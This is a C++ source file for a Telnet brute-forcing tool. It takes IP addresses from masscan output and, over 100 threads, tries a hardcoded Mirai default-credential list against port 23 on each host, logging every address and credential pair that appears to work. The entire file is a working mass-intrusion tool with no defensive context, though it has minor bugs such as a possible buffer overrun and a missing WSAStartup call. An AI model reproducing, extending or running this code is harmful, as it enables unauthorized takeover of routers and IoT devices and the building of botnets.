#include <iostream>
#include <vector>
#include <thread>
#include <winsock2.h>   // For Windows
// #include <sys/socket.h>   // Use this on Linux
// #include <netinet/in.h>   // Use this on Linux
// #include <arpa/inet.h>    // Use this on Linux
#include <cstring>
#include <fstream>
#include <sstream>

#pragma comment(lib, "ws2_32.lib")  // For Windows socket library

#define PORT 23
#define TIMEOUT 3
#define THREAD_COUNT 100

// Mirai's 60 default credentials
std::vector<std::pair<std::string, std::string>> credentials = {
    {"root", "vizxv"}, {"admin", "admin"}, {"root", "admin"},
    {"root", "root"}, {"admin", "password"}, {"root", "password"},
    {"admin", "1234"}, {"user", "user"}, {"root", "12345"},
    {"root", "123456"}, {"support", "support"}, {"admin", "12345"},
    {"admin", "123456"}, {"root", "1234"}, {"admin", "12345678"},
    {"admin", "admin1234"}, {"root", ""}, {"admin", ""},
    {"guest", "guest"}, {"root", "guest"}, {"guest", "12345"},
    {"guest", "123456"}, {"default", "default"}, {"root", "default"},
    {"admin", "1111"}, {"admin", "1111111"}, {"admin", "54321"},
    {"admin", "666666"}, {"admin", "888888"}, {"admin", "7ujMko0vizxv"},
    {"admin1", "password"}, {"administrator", "admin"}, {"supervisor", "supervisor"},
    {"root", "root123"}, {"admin", "root"}, {"root", "toor"},
    {"root", "123"}, {"root", "qwerty"}, {"admin", "qwerty"},
    {"root", "admin123"}, {"admin", "admin123"}, {"admin", "root123"},
    {"admin", "pass"}, {"root", "pass"}, {"admin", "111111"},
    {"root", "1"}, {"root", "12"}, {"root", "123"},
    {"root", "123456789"}, {"admin", "123456789"}, {"admin", "000000"},
    {"root", "000000"}, {"root", "abc123"}, {"admin", "abc123"},
    {"root", "1q2w3e4r"}, {"admin", "1q2w3e4r"}, {"admin", "1qaz2wsx"},
    {"admin", "admin1"}, {"admin", "test"}, {"test", "test"}
};

void try_telnet(const std::string& ip, const std::string& username, const std::string& password) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = inet_addr(ip.c_str());

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(sock);
        return;
    }

    // Send the username
    send(sock, username.c_str(), username.length(), 0);
    send(sock, "\r\n", 2, 0);

    // Send the password
    send(sock, password.c_str(), password.length(), 0);
    send(sock, "\r\n", 2, 0);

    // Check the response
    char buffer[1024];
    int len = recv(sock, buffer, sizeof(buffer), 0);
    if (len > 0) {
        buffer[len] = '\0';
        if (strstr(buffer, "incorrect") == nullptr) {
            std::cout << "[+] SUCCESS: " << ip << " with " << username << ":" << password << std::endl;
            std::ofstream log("success_logins.txt", std::ios_base::app);
            log << ip << " " << username << ":" << password << std::endl;
        }
    }

    closesocket(sock);
}

void scan_ip(const std::string& ip) {
    for (const auto& cred : credentials) {
        try_telnet(ip, cred.first, cred.second);
    }
}

void load_ips(const std::string& filename, std::vector<std::string>& ips) {
    std::ifstream file(filename);
    std::string line;
    while (std::getline(file, line)) {
        if (!line.empty()) {
            ips.push_back(line);
        }
    }
}

void worker(const std::vector<std::string>& ips, int start, int end) {
    for (int i = start; i < end; ++i) {
        scan_ip(ips[i]);
    }
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <masscan_output_file>" << std::endl;
        return 1;
    }

    std::vector<std::string> ips;
    load_ips(argv[1], ips);

    int num_threads = THREAD_COUNT;
    int ip_count = ips.size();
    int chunk_size = ip_count / num_threads;
    
    std::vector<std::thread> threads;
    for (int i = 0; i < num_threads; ++i) {
        int start = i * chunk_size;
        int end = (i == num_threads - 1) ? ip_count : (i + 1) * chunk_size;
        threads.push_back(std::thread(worker, std::ref(ips), start, end));
    }

    for (auto& t : threads) {
        t.join();
    }

    std::cout << "[*] Scan complete!" << std::endl;
    return 0;
}
